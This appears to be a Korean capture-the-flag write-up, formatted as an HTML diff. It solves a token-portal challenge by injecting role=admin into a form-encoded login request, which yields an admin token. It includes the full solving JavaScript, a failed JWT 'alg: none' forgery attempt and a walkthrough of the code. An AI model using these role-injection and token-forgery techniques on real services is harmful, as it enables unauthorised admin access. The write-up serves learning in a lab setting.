@@ -1,0 +1,112 @@
+<h3>문제설명:</h3>
+<p>아이디만 입력하면 로그인되고, 그 이후 서명된 토큰으로 `/admin` 접근을 시도할 수 있는 단체 포털이다. <br><br></p>
+<h3>목표:</h3>
+<p>발급받은 토큰으로 관리자 권한을 얻어라 <br><br></p>
+<h3>writeup&nbsp;:</h3>
+<p>페이지를 들어가면 이용권 발급란이 있고, 발급받은 토큰으로 운영본부 전용창구를 열어볼 수 있는지 확인하는 란이 있다. <br>페이지에&nbsp;적힌글을&nbsp;통해&nbsp;Post/login은&nbsp;아이디만으로&nbsp;서명된&nbsp;토큰을&nbsp;발급한다는것,&nbsp;그&nbsp;토큰을&nbsp;authorization:&nbsp;bearer&nbsp;&lt;token&gt;&nbsp;으로&nbsp;/admin에&nbsp;보내야한다는것을&nbsp;알&nbsp;수&nbsp;있었다. <br><br>guest&nbsp;로&nbsp;이용권을&nbsp;발급받으면 <br>다음과&nbsp;같은&nbsp;토큰이&nbsp;나온다. <br><br></p>
+<pre><code> "token": "eyJhbGciOiAiSFMyNTYifQ==.eyJ1c2VybmFtZSI6ICJndWVzdCIsICJyb2xlIjogImd1ZXN0In0=.dc9fc4a87109d2cbbc842fceee0045d768f8ee96ca363e863caec46d0a0808ff"</code></pre>
+<p><br><br>base64로&nbsp;디코딩해보면 <br>header에서&nbsp;hs256&nbsp;알고리즘이&nbsp;사용되었다는것,&nbsp;payload가&nbsp;username:&nbsp;guest,&nbsp;role:&nbsp;guest&nbsp;로&nbsp;되어있다는것을&nbsp;알&nbsp;수&nbsp;있었다. <br><br>그래서&nbsp;alg를&nbsp;none으로&nbsp;하고&nbsp;서명을.&nbsp;으로&nbsp;변조해서&nbsp;토큰을&nbsp;생성해보았다. <br>하지만&nbsp;유효하지않은&nbsp;토큰이라는&nbsp;메세지가&nbsp;떴다. <br><br>직접&nbsp;role&nbsp;:&nbsp;admin이라는것을&nbsp;login에&nbsp;보내야했다. <br>request&nbsp;header을&nbsp;보니&nbsp;content-type&nbsp;&nbsp;이&nbsp;application/x-www-form-urlencoded인것을&nbsp;확인할&nbsp;수&nbsp;있었다. <br><br>기본적인&nbsp;내용을&nbsp;내가&nbsp;재미나이에게&nbsp;주고&nbsp;재미나이가&nbsp;코드를&nbsp;짜주는&nbsp;식으로&nbsp;코드를&nbsp;붙여넣었다.&nbsp;코드는&nbsp;다음과&nbsp;같다&nbsp; <br><br></p>
+<pre><code>(async () =&gt; {
+    try {
+        // Form URL-encoded 형태로 데이터 준비 (username과 role을 주입)
+        const formData = new URLSearchParams();
+        formData.append('username', 'guest');
+        formData.append('role', 'admin');
+
+        // 1. /login에 Form 데이터 형식으로 POST 요청
+        console.log("[*] Form Data 방식으로 role=admin 주입 중...");
+        const loginResponse = await fetch('/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: formData
+        });
+
+        const loginData = await loginResponse.json();
+        const token = loginData.token;
+        
+        if (!token) {
+            console.error("[-] 토큰을 받지 못했습니다. 서버 응답을 확인하세요:", loginData);
+            return;
+        }
+        
+        console.log("[+] 발급된 토큰:", token);
+
+        // 2. 발급받은 토큰을 헤더에 담아 /admin에 GET 요청
+        console.log("[*] 발급된 토큰으로 /admin 페이지 호출 중...");
+        const adminResponse = await fetch('/admin', {
+            method: 'GET',
+            headers: {
+                'Authorization': `Bearer ${token}`
+            }
+        });
+
+        const resultText = await adminResponse.text();
+        console.log("%c[+] 서버 응답 결과 (Flag를 찾아보세요):", "color: green; font-weight: bold;");
+        console.log(resultText);
+
+    } catch (error) {
+        console.error("[-] 에러 발생:", error);
+    }
+})();</code></pre>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>처음보는 코드들이 있어 조금 더 자세히 쓰고자한다.</p>
+<pre><code>(async () =&gt; {
+    try {
+        // ... 코드 내용 ...
+    } catch (error) {
+        console.error("[-] 에러 발생:", error);
+    }
+})();</code></pre>
+<p>async 은 비동기 함수이다.</p>
+<p>&nbsp;</p>
+<h3>비동기 함수란?</h3>
+<p>특정 작업이 끝날 때까지 기다리지 않고, 다음 코드를 곧바로 실행하는 프로그래밍 방식이다.</p>
+<p><br>우선 웹 브라우저는 한번에 한 가지 일밖에 못하는 싱글스레드 이다. 그래서 만약 서버에서 큰 데이터를 받아오는 함수를 동기방식으로 실행한다면 데이터를 다 받아올때까지 브라우저가 움직이지않는다. (마우스 클릭과 화면스크롤을포함해서.. )</p>
+<p>아마 get과 post를 같이 써서 코드를 실행하는데 시간이 좀 걸려 비동기함수를 사용한듯하다.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<pre><code>const formData = new URLSearchParams();
+formData.append('username', 'guest');
+formData.append('role', 'admin');</code></pre>
+<p><br>URLSearchParams()는 key 값과 value 쌍으로 되어있다.</p>
+<p>서버가 원하는 방식에 맞춰 URLSearchParams를 구성했다. <br>인터넷 주소창에는&nbsp;&nbsp;?username=guest&amp;role=admin 이런식으로 나온다</p>
+<p>&nbsp;</p>
+<pre><code>const loginResponse = await fetch('/login', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: formData
+});
+const loginData = await loginResponse.json();
+const token = loginData.token;</code></pre>
+<p>&nbsp;</p>
+<p>페이지에 적혀있는대로 POST로 token을 발급받는다. 이때, 아까정의한 formData를 body 에 준다.</p>
+<p>그리고 서버가 보낸 응답을 json형태로 변환한다. 이때는 기다려야하므로 await가 붙는다. <br>서버가 발급해 준 jwt 토큰을 저장한다.&nbsp;</p>
+<p>&nbsp;</p>
+<pre><code>console.log("[*] 발급된 토큰으로 /admin 페이지 호출 중...");
+const adminResponse = await fetch('/admin', {
+    method: 'GET',
+    headers: {
+        'Authorization': `Bearer ${token}`
+    }
+});
+const resultText = await adminResponse.text();
+console.log("%c[+] 서버 응답 결과 (Flag를 찾아보세요):", "color: green; font-weight: bold;");</code></pre>
+<p>이제 아까받았던 토큰을 가지고 admin에 접근한다.</p>
+<p>그러면 flag가 나온다.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>이번 문제를 풀면서 삽질을 정말 많이 했는데 URLSearchParams()</p>
+<p>&nbsp;</p>
+<p>1. json 문자열로 보내기</p>
+<p>2. 토큰 직접만들기</p>
+<p>3. alg : none사용</p>
+<p>&nbsp;</p>
+<p>이것만 계속하면서 왜 안되지만 반복하고 있었다.</p>
+<p>URLSearchParams()에 대한 이해가 부족했던거 같다.</p>
+<p>이번 문제로 배울 수 있어서 기뻤다.</p>
